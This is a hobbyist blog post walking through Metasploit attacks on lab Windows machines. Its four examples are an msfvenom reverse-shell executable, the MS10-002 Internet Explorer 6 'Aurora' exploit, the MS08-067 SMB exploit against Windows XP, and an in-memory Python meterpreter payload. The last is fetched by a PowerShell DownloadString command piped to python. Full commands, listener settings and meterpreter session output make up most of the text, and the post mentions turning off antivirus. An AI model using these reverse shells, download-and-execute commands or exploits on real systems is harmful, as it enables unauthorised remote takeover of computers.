Metasploit
==========

:date: 2021-07-30 20:15
:tags: security, linux, hacking, metasploit, reverse shell,
:summary: Fun with Metasplot, aka How To Hack

I am a software developer and no a security researcher. But it is still
important to master the current security principles. Of course you can read all
about it, but more fun would be to try this out. Back in the days I already play
with some penetration tools on
`Backtrack <https://en.wikipedia.org/wiki/BackTrack>`__.
Mostly I hacked someone WLAN, or stuff like this.

Now its time to play with Metasploit. I don't go into too much detail, I just
try it out and present the results.


The Basics
----------
There are a lot of tools to have fun with security. We are going to use
Metasploit. I think you can install it on your system, but I work with Kali for
any security task I have. By the way I run Kali on
`Virtualbox <https://www.virtualbox.org>`__.
What I also use for my vulnerable targets.

  * `Kali <https://www.kali.org/get-kali/#kali-virtual-machines>`__
  * `Windows 10/8/7 <https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/#downloads>`__
  * `Windows 10 Development environment <https://developer.microsoft.com/de-de/windows/downloads/virtual-machines/>`__
  * `Windows XP <https://isoriver.com/windows-xp-iso-download/>`__

The basic steps for exploiting a system are:

  1. Choosing and configuring an exploit
      Code that enters a target system by taking advantage of one of its bugs.
  2. Choosing and configuring a payload
      Code that will be executed on the target system upon successful entry.
      Mostly this will by remote shell.
  3. Executing the exploit.
      ..


Example 0x01 - Revers Shell
---------------------------
You can create an executable file, that will connect to your device. Almost any
security scanner will detect this file. But anyway let us use this for the first
try. You may need to turn off your virus program. As you can see in the video,
Windows also detects and deletes this file, even though I had switched off
Windows Defender. This is the finale result, all commands below the video:

.. image:: {static}/images/articels/security/metasploit-001.gif
  :width: 100 %
  :alt: alternate text

First we create the execute file:

.. code-block:: bash

  $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.178.41 LPORT=5555 -f exe > shell.exe

Run web server with python to copy the file to the target:

.. code-block:: bash

  $ python3 -m http.server

Now you can download the file on the target. Before we execute it, we have to
setup Metasploit. Open Metasploit

.. code-block:: bash

  $ msfconsole

and set it up:

.. code-block:: bash

  msf6 > use exploit/multi/handler
  msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
  PAYLOAD => windows/meterpreter/reverse_tcp
  msf6 exploit(multi/handler) > set LHOST 192.168.178.41
  LHOST => 192.168.178.41
  msf6 exploit(multi/handler) > set LPORT 5555
  LPORT => 5555
  msf6 exploit(multi/handler) > run

Now execute the file on the target device.


Example 0x02 - Internet Explorer 6
----------------------------------
You see from the example before: If your system is up to date, it's hard to
execute an existing exploit. Now we will use something old, and slowly -
Internet Explorer 6. Yes the old on from Windows XP.

This is also a more realistic example. There is a program with a critical
security problem. If the user is interacting with the wrong data, you can take
over the system. For this exploit: Take the Internet Explorer 6 and visit the
wrong url.

This is how it looks, the commands are under the video:

.. image:: {static}/images/articels/security/metasploit-002.gif
  :width: 100 %
  :alt: alternate text

Start Metasploit

.. code-block:: bash

  $ msfconsole

and set it up:

.. code-block:: bash

  msf6 > use exploit/windows/browser/ms10_002_aurora
  msf6 exploit(windows/browser/ms10_002_aurora) > set PAYLOAD windows/meterpreter/reverse_tcp
  PAYLOAD => windows/meterpreter/reverse_tcp
  msf6 exploit(windows/browser/ms10_002_aurora) > set LHOST 192.168.178.41
  LHOST => 192.168.178.41
  msf6 exploit(windows/browser/ms10_002_aurora) > set LPORT 5555
  LPORT => 5555
  msf6 exploit(windows/browser/ms10_002_aurora) > set SRVHOST 192.168.178.41
  SRVHOST => 192.168.178.41
  msf6 exploit(windows/browser/ms10_002_aurora) > set SRVPORT 80
  SRVPORT => 80
  msf6 exploit(windows/browser/ms10_002_aurora) > set URIPATH /
  URIPATH => /
  msf6 exploit(windows/browser/ms10_002_aurora) > exploit
  [*] Exploit running as background job 0.
  [*] Exploit completed, but no session was created.
  msf6 exploit(windows/browser/ms10_002_aurora) >
  [*] Started reverse TCP handler on 192.168.178.41:5555
  [*] Using URL: http://192.168.178.41:80/
  [*] Server started.

If you now visit  http://192.168.178.41/ with Internet Explorer, you should see
something like:

.. code-block:: bash

  [*] 192.168.178.45   ms10_002_aurora - Sending MS10-002 Microsoft Internet Explorer "Aurora" Memory Corruption
  [*] Sending stage (175174 bytes) to 192.168.178.45
  [*] Meterpreter session 1 opened (192.168.178.41:5555 -> 192.168.178.45:1046) at 2021-07-26 04:33:54 -0400

You can now interact with the session:

.. code-block:: bash

  msf6 exploit(windows/browser/ms10_002_aurora) > sessions -l

  Active sessions
  ===============

    Id  Name  Type                     Information                            Connection
    --  ----  ----                     -----------                            ----------
    1         meterpreter x86/windows  AXJU-5980144708\axju @ AXJU-598014470  192.168.178.41:5555 -> 192.168.178.45
                                       8                                      :1046 (192.168.178.45)

  msf6 exploit(windows/browser/ms10_002_aurora) > sessions -i 1
  [*] Starting interaction with 1...

  meterpreter > sysinfo
  Computer        : AXJU-5980144708
  OS              : Windows XP (5.1 Build 2600, Service Pack 3).
  Architecture    : x86
  System Language : en_US
  Domain          : WORKGROUP
  Logged On Users : 2
  Meterpreter     : x86/windows
  meterpreter >


Example 0x03 - Windows XP
-------------------------
We're still on Windows XP. But now with a program that runs in the background.
The user doesn't have to do anything and we can still take over the system.
Again the finale result and the commands are below:

.. image:: {static}/images/articels/security/metasploit-003.gif
  :width: 100 %
  :alt: alternate text

Start Metasploit

.. code-block:: bash

  $ msfconsole

and set it up:

.. code-block:: bash

  msf6 > use exploit/windows/smb/ms08_067_netapi
  msf6 exploit(windows/smb/ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
  PAYLOAD => windows/meterpreter/reverse_tcp
  msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST 192.168.178.41
  LHOST => 192.168.178.41
  msf6 exploit(windows/smb/ms08_067_netapi) > set LPORT 5555
  LPORT => 5555
  msf6 exploit(windows/smb/ms08_067_netapi) > set RHOST 192.168.178.45
  RHOST => 192.168.178.45
  msf6 exploit(windows/smb/ms08_067_netapi) > exploit

Now you should see something like:

.. code-block:: bash

  [*] Started reverse TCP handler on 192.168.178.41:5555
  [*] 192.168.178.45:445 - Automatically detecting the target...
  [*] 192.168.178.45:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
  [*] 192.168.178.45:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
  [*] 192.168.178.45:445 - Attempting to trigger the vulnerability...
  [*] Sending stage (175174 bytes) to 192.168.178.45
  [*] Meterpreter session 1 opened (192.168.178.41:5555 -> 192.168.178.45:1038) at 2021-07-26 04:14:41 -0400

  meterpreter >

And this is all, now you have the control over the target system. See how
dangers Windows XP is?


Example 0x04 - Python
---------------------
Of course there are also complex methods of executing code on the target system.
The example is similar to the first, the user has to execute a command. Which
loads the code and runs it with Python. We assume that Python is installed on
the target. Since the payload is loaded directly into the memory, we can use
Windows 10 again. And Windows Defender can also be activated.

You know it, scroll for the commands or enjoy the video:

.. image:: {static}/images/articels/security/metasploit-004.gif
  :width: 100 %
  :alt: alternate text

.. code-block:: bash

  $ msfvenom -p python/meterpreter/reverse_tcp  LHOST=192.168.178.41 LPORT=5555 -f raw > shell.py
  $ python3 -m http.server

Now we quick config Metasploit:

.. code-block:: bash

  msf6 > use exploit/multi/handler
  [*] Using configured payload generic/shell_reverse_tcp
  msf6 exploit(multi/handler) > set PAYLOAD python/meterpreter/reverse_tcp
  PAYLOAD => python/meterpreter/reverse_tcp
  msf6 exploit(multi/handler) > set LHOST 192.168.178.41
  LHOST => 192.168.178.41
  msf6 exploit(multi/handler) > set LPORT 5555
  LPORT => 5555
  msf6 exploit(multi/handler) > exploit

  [*] Started reverse TCP handler on 192.168.178.41:5555
  [*] Sending stage (39392 bytes) to 192.168.178.42

On the target we open the PowerShell and execute:

.. code-block:: bash

  (new-object net.webclient).DownloadString('http://192.168.178.41:8000/shell.py') | python

This will load and execute the python script. Now you have access to the target
system with Metasploit:

.. code-block:: bash

  [*] Meterpreter session 1 opened (192.168.178.41:5555 -> 192.168.178.42:49636) at 2021-07-26 05:30:28 -0400

  meterpreter >


Conclusion
----------
This is funny. I enjoy playing with some security tools. And knowing some Issues
from other programs will make you write better source code.
